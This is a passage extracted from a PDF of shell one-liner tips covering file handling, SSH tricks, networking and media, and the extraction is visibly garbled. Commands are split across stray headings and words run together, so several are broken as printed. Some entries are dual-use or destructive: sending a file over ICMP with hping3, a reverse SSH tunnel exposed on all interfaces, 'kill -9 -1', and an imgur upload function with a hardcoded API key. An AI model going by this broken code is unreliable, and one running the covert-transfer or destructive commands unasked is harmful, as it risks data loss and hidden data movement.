### Ask for a password, the passwd-style
``` linux
$ read -s -p"Password: " USER_PASSWORD_VARIABLE; echo
```
### 57 | P a g e
```
### TechCircleMonitor memory usage
``` linux
$ watch vmstat -sSM
```
### Content search.
``` linux
$ ff() { local IFS='|'; grep -rinE "$*" . ; }
```
### Timer with sound alarm
``` linux
$ sleep 3s && espeak "wake up, you bastard" 2>/dev/null
```
### Rapidly invoke an editor to write a long, complex, or tricky
```
### command
``` linux
$ <ESC> v
```
### Run command on a group of nodes in parallel
``` linux
$ echo "uptime" | tee >(ssh host1) >(ssh host2) >(ssh host3)
```
### List of commands you use most often
``` linux
$ history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head >
```
### /tmp/cmds | gnuplot -persist <(echo 'plot "/tmp/cmds" using 1:xticlabels(2) with
```
### boxes')
```
### Kill process by name
``` linux
$ pkill -x firefox
```
### Change prompt to MS-DOS one (joke)
``` linux
$ export PS1="C:\$( pwd | sed 's:/:\\\\\\:g' )\\> "
```
### Make ISO image of a folder
``` linux
$ mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso
```
### ~/OpenCD
```
### A shell function to print a ruler the width of the terminal window.
``` linux
$ ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<=$
```
### (( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do echo -n $s; done ); str=$( echo $str | cut
```
### -c -$COLUMNS) ; echo $str; done; }
```
### Typing the current date ( or any string ) via a shortcut as if the keys
```
### had been actually typed with the hardware keyboard in any
```
### application.
``` linux
$ xvkbd -xsendevent -text $(date +%Y%m%d)
```
### Update twitter via curl (and also set the "from" bit)
``` linux
$ curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL"
```
### http://twitter.com/statuses/update.xml
```
### 58 | P a g e
```
### TechCircleQuickest (i blv) way to get the current program name minus the
```
### path (BASH)
``` linux
$ path_stripped_programname="${0##*/}"
```
### A trash function for bash
``` linux
$ trash <file>
```
### Clean your broken terminal
``` linux
$ stty sane
```
### Play music from youtube without download
``` linux
$ wget -q -O - `youtube-dl -b -g $url`| ffmpeg -i - -f mp3 -vn -acodec libmp3lame -|
```
### mpg123 -
```
### Generate a unique and secure password for every website that you
```
### login to
``` linux
$ sitepass() { echo -n "$@" | md5sum | sha1sum| sha224sum | sha256sum |
```
### sha384sum |sha512sum | gzip - | s trings -n 1 | tr -d "[:space:]" | tr -s '[:print:]' | tr '!-
```
### ~' 'P-~!-O' | rev | cut-b 2-11; history -d $(($HISTCMD-1)); }
```
### Search back through previous commands
``` linux
$ Ctrl-R <search-text>
```
### Identify differences between directories (possibly on different
```
### servers)
``` linux
$ diff <(ssh server01 'cd config; find . -type f -exec md5sum {} \;| sort -k 2') <(ssh
```
### server02 'cd config; find . -type f -exec md5sum {} \;| sort -k 2')
```
### Replace spaces in filenames with underscores
``` linux
$ rename -v 's/ /_/g' *
```
### Show directories in the PATH, one per line
``` linux
$ echo "${PATH//:/$'
```
### '}"
```
### Move a lot of files over ssh
``` linux
$ rsync -az /home/user/test user@sshServer:/tmp/
```
### Find and delete empty dirs, start in current working dir
``` linux
$ find . -empty -type d -exec rmdir {} +
```
### List your largest installed packages.
``` linux
$ wajig large
```
### 59 | P a g e
```
### TechCircleMonitor TCP opened connections
``` linux
$ watch -n 1 "netstat -tpanl | grepESTABLISHED"
```
### Fix Ubuntu's Broken Sound Server
``` linux
$ sudo killall -9 pulseaudio; pulseaudio >/dev/null 2>&1 &
```
### Download all Delicious bookmarks
``` linux
$ curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
```
### Beep when a server goes offline
``` linux
$ while true; do [ "$(ping -c1W1w1 server-or-ip.com | awk '/received/ {print $4}')" !
```
### = 1 ] && beep; sleep 1; done
```
### Number of open connections per ip.
``` linux
$ netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort |uniq -c | sort -n
```
### Fibonacci numbers with awk
``` linux
$ seq 50| awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'
```
### Create a favicon
``` linux
$ convert -colors 256 -resize 16x16 face.jpg face.ppm && ppmtowinicon -output
```
### favicon.ico face.ppm
```
### Check Ram Speed and Type in Linux
``` linux
$ sudo dmidecode --type 17 | more
```
### Run the Firefox Profile Manager
``` linux
$ firefox -no-remote -P
```
### Add forgotten changes to the last git commit
``` linux
$ git commit --amend
```
### Sort dotted quads
``` linux
$ sort -nt . -k 1,1 -k 2,2 -k 3,3 -k 4,4
```
### Get Dell Service Tag Number from a Dell Machine
``` linux
$ sudo dmidecode | grep Serial\ Number | head -n1
```
### Resume aborted scp file transfers
``` linux
$ rsync --partial --progress --rsh=ssh SOURCE DESTINATION
```
### Add your public SSH key to a server in one command
``` linux
$ cat . ssh/id_rsa.pub | ssh hostname ' cat >> . ssh/authorized_keys'
```
### 60 | P a g e
```
### TechCircleCycle through a 256 colour palette
``` linux
$ yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m
```
### "; sleep .01; done
```
### Google text-to-speech in mp3 format
``` linux
$ t2s() { wget -q -U Mozilla -O $(tr ' ' _ <<< "$1"|cut -b 1-15).mp3
```
### "http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=$(tr ' ' + <<< "$1")";
```
### }
```
### Google verbatim search on your terminal
``` linux
$ function google { Q="$@"; GOOG_URL='https://www. google.de/search?
```
### tbs=li:1&q='; AGENT="Mozilla/4.0"; stream=$(curl -A "$AGENT" -skLm 10 "$
```
### {GOOG_URL}${Q//\ /+}" | grep -oP '\/url\?q=.+?&amp' | sed 's|/url?q=||; s|&amp||');
```
### echo -e "${stream//\%/\x}"; }
```
### Grep processes list avoiding the grep itself
``` linux
$ ps axu | grep [a]pache2
```
### Swap the two last arguments of the current command line
``` linux
$ <ctrl+e> <esc+t>
```
### Transfer a file to multiple hosts over ssh
``` linux
$ pscp -h hosts.txt -l username /etc/hosts /tmp/hosts
```
### Tail a log over ssh
``` linux
$ ssh -t remotebox "tail -f /var/log/remote.log"
```
### Du with colored bar graph
``` linux
$ t=$(df| awk 'NR!=1{sum+=$2}END{print sum}');sudo du / --max-depth=1|sed
```
### '$d'|sort -rn -k1 | awk -v t=$t 'OFMT="%d" {M=64; for (a=0;a<$1;a++){if (a>c)
```
### {c=a}}br=a/c;b=M*br;for(x=0;x<b;x++){printf "\033[1;31m" "|" "\033[0m"}print "
```
### "$2" "(a/t*100)"% total"}'
```
### Sort the output of the 'du' command by largest first, using human
```
### readable output.
``` linux
$ du -h --max-depth=1 |sort -rh
```
### Verify/edit bash history command before executing it
``` linux
$ shopt -s histverify
```
### Resize an image to at least a specific resolution
``` linux
$ convert -resize '1024x600^' image.jpg small-image.jpg
```
### Query well known ports list
``` linux
$ getent services <<service>>
```
### 61 | P a g e
```
### TechCircleCreate .pdf from .doc
``` linux
$ oowriter -pt pdf your_word_file.doc
```
### Diff XML files
``` linux
$ diffxml() { diff -wb <(xmllint --format "$1") <(xmllint --format "$2"); }
```
### Discovering all open files/dirs underneath a directory
``` linux
$ lsof +D <dirname>
```
### Clear screen, keep prompt at eye-level (faster than clear(1), tput cl,
```
### etc.)
``` linux
$ cls(){ printf "\33[2J";} or, if no printf, cat >cls;<ctrl-v><ctrl+
```
### [>[2J<enter><ctrl+d> cls(){ cat cls;}
```
### Down for everyone or just me?
``` linux
$ down4me() { wget -qO - "http://www.downforeveryoneorjustme.com/$1" |sed
```
### '/just you/!d;s/<[^>]*>//g' ; }
```
### A formatting test for David Winterbottom: improving
```
### commandlinefu for submitters
``` linux
$ echo "?????, these are the umlauted vowels I sing to you. Oh, and sometimes ?,
```
### but I don't sing that one cause it doesn't rhyme."
```
### Run a program transparently, but print a stack trace if it fails
``` linux
$ gdb -batch -ex "run" -ex "bt" ${my_program} 2>&1 | grep -v ^"No stack."$
```
### Compare copies of a file with md5
``` linux
$ cmp file1 file2
```
### Backup delicious bookmarks
``` linux
$ curl --user login:password -o DeliciousBookmarks.xml -O
```
### 'https://api.del.icio.us/v1/posts/all'
```
### Continue a current job in the background
``` linux
$ <ctrl+z> bg
```
### Get all links of a website
``` linux
$ lynx -dump http://www.domain.com | awk'/http/{print $2}'
```
### Find all active ip's in a subnet
``` linux
$ sudo arp-scan -I eth0 192.168.1.0/24
```
### Display BIOS Information
``` linux
$ dmidecode -t bios
```
### 62 | P a g e
```
### TechCircleDisassemble some shell code
``` linux
$ echo -ne "<shellcode>" | x86dis -e 0 -s intel
```
### List bash functions defined in .bash_profile or .bashrc
``` linux
$ compgen -A function
```
### Ignore the .svn directory in filename completion
``` linux
$ export FIGNORE=.svn
```
### Working random fact generator
``` linux
$ wget randomfunfacts.com -O - 2>/dev/null |grep \<strong\> | sed "s;^.*<i>\
```
### (.*\)</i>.*$;\1;"
```
### Remote backups with tar over ssh
``` linux
$ tar jcpf - [sourceDirs] |ssh user@host "cat > /path/to/backup/backupfile. tar.bz2"
```
### Pronounce an English word using Dictionary.com
``` linux
$ pronounce(){ wget -qO- $( wget -qO- "http://dictionary.reference.com/browse/$@"
```
### |grep 'soundUrl' | head -n 1 | sed 's|.*soundUrl=\([^&]*\)&.*|\1|' | sed
```
### 's/%3A/:/g;s/%2F/\//g') | mpg123 -; }
```
### Change pidgin status
``` linux
$ purple-remote "setstatus?status=away&message=AFK"
```
### Grep by paragraph instead of by line.
``` linux
$ grepp() { [ $# -eq 1 ] && perl -00ne "print if /$1/i" || perl -00ne "print if /$1/i" <
```
### "$2";}
```
### Vim: Switch from Horizontal split to Vertical split
``` linux
$ ^W-L
```
### Numbers guessing game
``` linux
$ A=1;B=100;X=0;C=0;N=$[$RANDOM%$B+1];until [ $X -eq $N ];do read -p "N
```
### between $A and $B. Guess? " X;C=$(($C+1));A=$(($X<$N?$X:$A));B=$(($X>$N?
```
### $X:$B));done;echo "Took you $C tries, Einstein";
```
### Sort all running processes by their memory & CPU usage
``` linux
$ ps aux --sort=%mem,%cpu
```
### Change user, assume environment, stay in current dir
``` linux
$ su -- user
```
### Save current layout of top
``` linux
$ <Shift + W>
```
### 63 | P a g e
```
### TechCircleFunction that outputs dots every second until command completes
``` linux
$ sleeper(){ while `ps -p $1 &>/dev/null`; do echo-n "${2:-.}"; sleep ${3:-1};
```
### done; }; export -fsleeper
```
### Testing hard disk reading speed
``` linux
$ hdparm -t /dev/sda
```
### How fast is the connexion to a URL, some stats from curl
``` linux
$ URL="http://www.google.com";curl -L --w "$URL
```
### DNS %{ time_namelookup}s conn %{ time_connect}s time %{ time_total}s
```
### Speed %{speed_download}bps Size %{size_download}bytes
```
### " -o/dev/null -s $URL
```
### An easter egg built into python to give you the Zen of Python
``` linux
$ python -c 'import this'
```
### Get all IPs via ifconfig
``` linux
$ ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ &&print $1'
```
### Use Cygwin to talk to the Windows clipboard
``` linux
$ cat /dev/clipboard; $(somecommand) > /dev/clipboard
```
### List programs with open ports and connections
``` linux
$ lsof -i
```
### Find corrupted jpeg image files
``` linux
$ find . -name "*jpg" -exec jpeginfo -c {} \; | grep -E "WARNING|ERROR"
```
### 'Fix' a typescript file created by the 'script' program to remove
```
### control characters
``` linux
$ cat typescript | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > typescript-
```
### processed
```
### Share a 'screen'-session
``` linux
$ screen -x
```
### Purge configuration files of removed packages on debian based
```
### systems
``` linux
$ sudo aptitude purge `dpkg --get-selections |grep deinstall | awk '{print $1}'`
```
### Show all detected mountable Drives/Partitions/BlockDevices
``` linux
$ hwinfo --block --short
```
### Merge *.pdf files
``` linux
$ gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -
```
### sOutputFile=out.pdf `ls *.pdf`
```
### 64 | P a g e
```
### TechCircleAppend stdout and stderr to a file, and print stderr to the screen
```
### [bash]
``` linux
$ somecommand 2>&1 >> logfile | tee -a logfile
```
### Quickly change all .html extensions on files in folder to .htm
``` linux
$ for i in *.html ; do mv $i ${i%.html}.htm ; done
```
### Delete the specified line
``` linux
$ sed -i 8d ~/.ssh/known_hosts
```
### Read the output of a command into the buffer in vim
``` linux
$ :r !command
```
### Find broken symlinks
``` linux
$ find . -type l ! -exec test -e {} \; -print
```
### Ssh tunnel with auto reconnect ability
``` linux
$ while [ ! -f /tmp/stop ]; do ssh -o ExitOnForwardFailure=yes -R 2222:localhost:22
```
### target "while nc -zv localhost 2222; do sleep 5; done"; sleep 5;done
```
### Find process associated with a port
``` linux
$ fuser [portnumber]/[proto]
```
### Scping files with streamlines compression (tar gzip)
``` linux
$ tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination
```
### Add all files not under version control to repository
``` linux
$ svn status |grep '\?' |awk '{print $2}'| xargs svn add
```
### Disco lights in the terminal
``` linux
$ while true; do printf "\e[38;5;$(($(od -d -N 2 -A n /dev/urandom)%$(tput
```
### colors)))m.\e[0m"; done
```
### Select rectangular screen area
``` linux
$ Ctrl + Alt
```
### Show how old your linux OS installtion is
``` linux
$ sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
```
### Discover the process start time
``` linux
$ ps -eo pid,lstart,cmd
```
### Automatically find and re-attach to a detached screen session
``` linux
$ screen -D -R
```
### 65 | P a g e
```
### TechCircleThis is how you should push a string in a command's stdin.
``` linux
$ command <<< word
```
### Ping as traceroute
``` linux
$ for i in {1..30}; do ping -t $i -c 1 google.com; done | grep "Time to live exceeded"
```
### What model of computer I'm using?
``` linux
$ sudo dmidecode | grep Product
```
### Extract tar content without leading parent directory
``` linux
$ tar -xaf archive. tar.gz --strip-components=1
```
### Target a specific column for pattern substitution
``` linux
$ awk '{gsub("foo","bar",$5)}1' file
```
### Run a command when a file is changed
``` linux
$ while inotifywait -e modify /tmp/myfile; do firefox; done
```
### Substrings a variable
``` linux
$ var='123456789'; echo ${var:<start_pos>:<offset>}
```
### One command line web server on port 80 using nc (netcat)
``` linux
$ while true ; do nc -l 80 < index.html ; done
```
### RDP through SSH tunnel
``` linux
$ ssh -f -L3389:<RDP_HOST>:3389 <SSH_PROXY> "sleep 10" && rdesktop -
```
### T'<WINDOW_TITLE>' -uAdministrator -g800x600 -a8 -rsound:off -
```
### rclipboard:PRIMARYCLIPBOARD -5 localhost
```
### "Clone" a list of installed packages from one Debian/Ubuntu Server
```
### to another
``` linux
$ apt-get install `ssh root@host_you_want_to_clone "dpkg -l | grep ii" | awk '{print
```
### $2}'`
```
### Remote screenshot
``` linux
$ ssh user@remote-host "DISPLAY=:0.0 import -window root -format png -"|display -
```
### format png -
```
### Google text-to-speech in mp3 format
``` linux
$ say(){ mplayer -user-agent Mozilla "http://translate.google.com/translate_tts?
```
### tl=en&q=$(echo $* | sed 's#\ #\+#g')" > /dev/null 2>&1 ; }
```
### Add the result of a command into vi
``` linux
$ !!command
```
### 66 | P a g e
```
### TechCirclePlace the NUM-th argument of the most recent command on the
```
### shell
``` linux
$ <ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>
```
### Find the package a command belongs to on Debian
``` linux
$ dpkg -S $( which ls )
```
### Look up a unicode character by name
``` linux
$ egrep -i "^[0-9a-f]{4,} .*$*" $(locate CharName.pm) | while read h d; do
```
### /usr/bin/printf "\U$(printf "%08x" 0x$h)\tU+%s\t%s
```
### " $h "$d"; done
```
### Start dd and show progress every X seconds
``` linux
$ dd if=/path/inputfile | pv | dd of=/path/outpufile
```
### Ask user to confirm
``` linux
$ Confirm() { read -sn 1 -p "$1 [Y/N]? "; [[ $REPLY = [Yy] ]]; }
```
### Random unsigned integer
``` linux
$ echo $(openssl rand 4 | od -DAn)
```
### Kill all process that belongs to you
``` linux
$ kill -9 -1
```
### Make a file not writable / immutable by root
``` linux
$ sudo chattr +i <file>
```
### Analyze traffic remotely over ssh w/ wireshark
``` linux
$ ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -
```
### Send email with curl and gmail
``` linux
$ curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt
```
### "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt
```
### Translates acronyms for you
``` linux
$ wtf is <acronym>
```
### Delete DOS Characters via VIM (^M)
``` linux
$ :set ff=unix
```
### Create an animated gif from a Youtube video
``` linux
$ url=http://www.youtube.com/watch?v=V5bYDhZBFLA; youtube-dl -b $url; mplayer
```
### $(ls ${url##*=}*| tail -n1) -ss 00:57 -endpos 10 -vo gif89a:fps=5:output=output.gif
```
### -vf scale=400:300 -nosound
```
### 67 | P a g e
```
### TechCirclePrint just line 4 from a textfile
``` linux
$ sed -n '4{p;q}'
```
### Print just line 4 from a textfile
``` linux
$ sed -n '4p'
```
### Quick HTML image gallery from folder contents
``` linux
$ find . -iname '*.jpg' -exec echo '<img src="{}">' \; > gallery.html
```
### Get your external IP address without curl
``` linux
$ wget -qO- icanhazip.com
```
### Resume a detached screen session, resizing to fit the current
```
### terminal
``` linux
$ screen -raAd
```
### Start a HTTP server which serves Python docs
``` linux
$ pydoc -p 8888 & gnome-openhttp://localhost:8888
```
### Do some learning...
``` linux
$ ls /usr/bin | xargs whatis | grep -v nothing | less
```
### Insert the last argument of the previous command
``` linux
$ <ALT> .
```
### Carriage return for reprinting on the same line
``` linux
$ while true; do echo -ne "$(date)\r"; sleep 1; done
```
### Copy a folder tree through ssh using compression (no temporary
```
### files)
``` linux
$ ssh <host> ' tar -cz /<folder>/<subfolder>' | tar-xvz
```
### Command line calculator
``` linux
$ calc(){ awk "BEGIN{ print $* }" ;}
```
### Backup a local drive into a file on the remote host via ssh
``` linux
$ dd if=/dev/sda | ssh user@server ' ddof=sda.img'
```
### Kill processes that have been running for more than a week
``` linux
$ find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec basename {} \; |
```
### xargs kill -9
```
### List Network Tools in Linux
``` linux
$ apropos network |more
```
### 68 | P a g e
```
### TechCirclePrint text string vertically, one character per line.
``` linux
$ echo "vertical text" | grep -o '.'
```
### Add prefix onto filenames
``` linux
$ rename 's/^/prefix/' *
```
### Salvage a borked terminal
``` linux
$ <ctrl+j>stty sane<ctrl+j>
```
### Pick a random line from a file
``` linux
$ shuf -n1 file.txt
```
### Get all these commands in a text file with description.
``` linux
$ for x in `jot - 0 2400 25`; do
```
### curl"http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/
```
### $x" ; done > commandlinefu.txt
```
### Stripping ^M at end of each line for files
``` linux
$ dos2unix <filenames>
```
### Backup files incremental with rsync to a NTFS-Partition
``` linux
$ rsync -rtvu --modify-window=1 --progress /media/SOURCE/ /media/TARGET/
```
### Find removed files still in use via /proc
``` linux
$ find -L /proc/*/fd -links 0 2>/dev/null
```
### Connect to google talk through ssh by setting your IM client to use
```
### the localhost 5432 port
``` linux
$ ssh -f -N -L 5432:talk.google.com:5222 user@home.network.com
```
### Urldecoding
``` linux
$ sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' | xargsecho -e
```
### For all flv files in a dir, grab the first frame and make a jpg.
``` linux
$ for f in *.flv; do ffmpeg -y -i "$f" -f image2 -ss 10 -vframes 1 -an "${f%.flv}.jpg";
```
### done
```
### Wrap long lines of a text
``` linux
$ fold -s -w 90 file.txt
```
### Validate and pretty-print JSON expressions.
``` linux
$ echo '{"json":"obj"}' | python -m simplejson.tool
```
### Grep colorized
``` linux
$ grep -i --color=auto
```
### 69 | P a g e
```
### TechCircleFrom within vi, pipe a chunk of lines to a command line and replace
```
### the chunk with the result
``` linux
$ !}sort
```
### Grep for word in directory (recursive)
``` linux
$ grep --color=auto -iRnH "$search_word" $directory
```
### Unix alias for date command that lets you create timestamps in ISO
```
### 8601 format
``` linux
$ alias timestamp='date "+%Y%m%dT%H%M%S"'
```
### Another Curl your IP command
``` linux
$ curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
```
### Count IPv4 connections per IP
``` linux
$ netstat -anp |grep 'tcp\|udp' | awk '{print $5}' |sed s/::ffff:// | cut -d: -f1 | sort |
```
### uniq -c | sort -n
```
### Files extension change
``` linux
$ rename .oldextension .newextension *.oldextension
```
### Archive all files containing local changes (svn)
``` linux
$ svn st | cut -c 8- | sed 's/^/\"/;s/$/\"/' | xargs tar -czvf ../backup.tgz
```
### Just run it ;)
``` linux
$ echo SSBMb3ZlIFlvdQo= | base64 -d
```
### Pattern match in awk - no grep
``` linux
$ awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'
```
### Optimal way of deleting huge numbers of files
``` linux
$ find /path/to/dir -type f -print0 | xargs -0 rm
```
### Du with colored bar graph
``` linux
$ du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1}
```
### NR>1{r=int($1/t*c+.5); b="\033[1;31m"; for (i=0; i<r; i++) b=b"#"; printf " %5.2f
```
### %% %s\033[0m %s
```
### ", $1/t*100, b, $2}'|tac
```
### Mount a VMware virtual disk (.vmdk) file on a Linux box
``` linux
$ kpartx -av <image-flat.vmdk>; mount -o /dev/mapper/loop0p1 /mnt/vmdk
```
### Quick copy
``` linux
$ cp foo{,bak}
```
### 70 | P a g e
```
### TechCircleSending a file over icmp with hping
``` linux
$ hping3 10.0.2.254 --icmp --sign MSGID1 -d 50 -c 1 --file a_file
```
### Fetch the current human population of Earth
``` linux
$ curl -s http://www.census.gov/popclock/data/population/world | python -c 'import
```
### json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
```
### Kill a broken ssh connection
``` linux
$ <Return>~.
```
### Convert JSON to YAML
``` linux
$ ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' < file.json >
```
### file.yaml
```
### Convert Shell Text to Upper/Lower Case
``` linux
$ ALT-U / ALT-L
```
### The fastest remote directory rsync over ssh archival I can muster
```
### (40MB/s over 1gb NICs)
``` linux
$ rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o
```
### Compression=no -x" user@<source>:<source_dir> <dest_dir>
```
### Binary digits Matrix effect
``` linux
$ perl -e '$|++; while (1) { print " " x (rand(35) + 1), int(rand(2)) }'
```
### Open two files side by side in vim (one window, two panes)
``` linux
$ vim -O file1 file2
```
### Repeat a command every one second
``` linux
$ watch -n 1 "do foo"
```
### Update all packages installed via homebrew
``` linux
$ brew update && brew upgrade `brew outdated`
```
### Daemonize nc - Transmit a file like a http server
``` linux
$ while ( nc -l 80 < /file.htm > : ) ; do : ; done &
```
### Find ulimit values of currently running process
``` linux
$ cat /proc/PID/limits
```
### Diff current vi buffer edits against original file
``` linux
$ :w !diff -u % -
```
### 71 | P a g e
```
### TechCircleRedirect tar extract to another directory
``` linux
$ tar xfz filename. tar.gz -C PathToDirectory
```
### Print multiplication formulas
``` linux
$ seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR,
```
### i*NR, i==NR?"
```
### ":"\t")}'
```
### Find Malware in the current and sub directories by MD5 hashes
``` linux
$ IFS=$'
```
### ' && for f in `find . -type f -exec md5sum "{}" \;`; do echo $f | sed -r 's/^[^
```
### ]+/Checking:/'; echo $f |cut -f1 -d' ' | netcat hash.cymru.com 43 ; done
```
### Watch several log files of different machines in a single multitail
```
### window on your own machine
``` linux
$ multitail -l 'ssh machine1 "tail -f /var/log/apache2/error.log"' -l 'ssh machine2 "tail
```
### -f /var/log/apache2/error.log"'
```
### Execute a command, convert output to .png file, upload file to
```
### imgur.com, then returning the address of the .png.
``` linux
$ imgur(){ $*|convert label:@- png:-|curl -F "image=@-" -F
```
### "key=1913b4ac473c692372d108209958fd15" http://api.imgur.com/2/upload.xml|
```
### grep -Eo "<original>(.)*</original>" | grep -Eo "http://i.imgur.com/[^<]*";}
```
### All out
``` linux
$ pkill -KILL -u username
```
### Numeric zero padding file rename
``` linux
$ rename 's/\d+/sprintf("%04d",$&)/e' *.jpg
```
### Find out the starting directory of a script
``` linux
$ echo "${0%/*}"
```
### Selecting a random file/folder of a folder
``` linux
$ shuf -n1 -e *
```
### List your MACs address
``` linux
$ lsmac() { ifconfig -a | sed '/eth\|wl/!d;s/ Link.*HWaddr//' ; }
```
### Ssh to machine behind shared NAT
``` linux
$ ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com
```
### Countdown Clock
``` linux
$ MIN=10;for ((i=MIN*60;i>=0;i--));do echo -ne "\r$(date -d"0+$i sec" +%H:%M:
```
### %S)";sleep 1;done
```
### 72 | P a g e
```
### TechCircleList all file extensions in a directory
``` linux
$ find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g
```
### Send an http HEAD request w/curl
``` linux
$ curl -I http://localhost
```
### View hex mode in vim
``` linux
$ :%!xxd
```
### View ~/.ssh/known_hosts key information
``` linux
$ ssh-keygen -l -f ~/.ssh/known_hosts
```
### Kill all Zombie processes (Guaranteed!)
``` linux
$ kill -9 `ps -xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'`
```
### Prevent accidents and test your command with echo
``` linux
$ echo rm *.txt
```
### Exclude a column with awk
``` linux
$ awk '{ $5=""; print }' file
```
### Get My Public IP Address
``` linux
$ curl ifconfig.me
```
### Pretend to be busy in office to enjoy a cup of coffee
``` linux
$ for i in `seq 0 100`;do timeout 6 dialog --gauge "Install..." 6 40 "$i";done
```
### Empty a file
``` linux
$ :> file
```
### Better way to use notify-send with at or cron
``` linux
$ DISPLAY=:0.0 XAUTHORITY=~/.Xauthoritynotify-send test
```
### Emptying a text file in one shot
``` linux
$ :%d
```
### Computes the most frequent used words of a text file
``` linux
$ cat WAR_AND_PEACE_By_LeoTolstoi.txt | tr -cs "[:alnum:]" "
```
### "| tr "[:lower:]" "[:upper:]" | awk '{h[$1]++}END{for (i in h){print h[i]" "i}}'|sort -nr
```
### | cat -n | head -n 30
```
### Countdown Clock
``` linux
$ MIN=1 && for i in $(seq $(($MIN*60)) -1 1); do echo -n "$i, "; sleep 1; done; echo -
```
### e "
```
### 73 | P a g e
```
### TechCircleBOOOM! Time to start."
```
### Print info about your real user.
``` linux
$ who loves mum
```
### Serve current directory tree at http://$HOSTNAME:8080/
``` linux
$ twistd -n web --path .
```
### JSON processing with Python
``` linux
$ curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | less -R
```
### Move items from subdirectories to current directory
``` linux
$ find -type f -exec mv {} . \;
```
### Restrict the bandwidth for the SCP command
``` linux
$ scp -l10 pippo@serverciccio:/home/zutaniddu/* .
```
### Optimize PDF documents
``` linux
$ gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -
```
### dNOPAUSE -dQUIET -dBATCH -sOutputFile=output.pdf input.pdf
```
### Live ssh network throughput test
``` linux
$ pv /dev/zero|ssh $host 'cat > /dev/null'
```
### Bash screensaver (scrolling ascii art with customizable message)
``` linux
$ while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS="
```
### " read l; do echo "$l"; sleep 0.01; done; done
```
### Upgrade all perl modules via CPAN
``` linux
$ cpan -r
```
### Remove lines that contain a specific pattern($1) from file($2).
``` linux
$ sed -i '/myexpression/d' /path/to/file.txt
```
### List your largest installed packages (on Debian/Ubuntu)
``` linux
$ dpigs
```
### Rsync + find
``` linux
$ find . -name "whatever.*" -print0 | rsync -av --files-from=- --from0 ./ ./destination/
```
### Autossh + ssh + screen = super rad perma-sessions
``` linux
$ AUTOSSH_POLL=1 autossh -M 21010hostname -t 'screen -Dr'
```
### 74 | P a g e
```
### TechCircleRecord microphone input and output to date stamped mp3 file
``` linux
$ arecord -q -f cd -r 44100 -c2 -t raw | lame -S -x -h -b 128 - `date +%Y%m%d%H
```
### %M`.mp3
```
### Find running binary executables that were not installed using dpkg
``` linux
$ cat /var/lib/dpkg/info/*.list > /tmp/listin ; ls/proc/*/exe |xargs -l readlink | grep -
```
### xvFf /tmp/listin; rm /tmp/listin
```
### Cycle through a 256 colour palette
``` linux
$ yes "$(seq 1 255)" | while read i; do printf"\x1b[48;5;${i}m
```
### "; sleep .01; done
```
### Parallel file downloading with wget
``` linux
$ wget -nv http://en.wikipedia.org/wiki/Linux -O- |egrep -o "http://[^[:space:]]*.jpg" |
```
### xargs -P 10 -r -n 1 wget -nv
```
### Move a lot of files over ssh
``` linux
$ tar -cf - /home/user/test | gzip -c | ssh user@ sshServer 'cd /tmp; tar xfz -'
```
### Cleanup firefox's database.
``` linux
$ pgrep -u `id -u` firefox-bin || find~/.mozilla/firefox -name '*.sqlite'|(while read -e f;
```
### do echo 'vacuum;'|sqlite3 "$f" ; done)
```
### Vim easter egg
``` linux
$ $ vim ... :help 42
```
### Find the process you are looking for minus the grepped one
``` linux
$ pgrep command_name
```
### Stream YouTube URL directly to mplayer
``` linux
$ id="dMH0bHeiRNg";mplayer -fs http://youtube.com/get_video.php?video_id=$id\
```
### &t=$(curl -s http://www.youtube.com/watch?v=$id | sed -n 's/.*, "t": "\([^"]*\)", .*/\
```
### 1/p')
```
### Update twitter via curl
``` linux
$ curl -u user -d status="Tweeting from the shell"
```
### http://twitter.com/statuses/update.xml
```
### Ssh autocomplete
``` linux
$ complete -W "$(echo $(grep '^ ssh ' .bash_history | sort -u | sed 's/^ ssh //'))" ssh
```
### Get all IPs via ifconfig
``` linux
$ ifconfig | perl -nle'/dr:(\S+)/ && print $1'
```
### 75 | P a g e
```
### TechCircleVIM: Replace a string with an incrementing number between marks
```
### 'a and 'b (eg, convert string ZZZZ to 1, 2, 3, ...)
``` linux
$ :let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1
```
### Get the canonical, absolute path given a relative and/or
```
### noncanonical path
``` linux
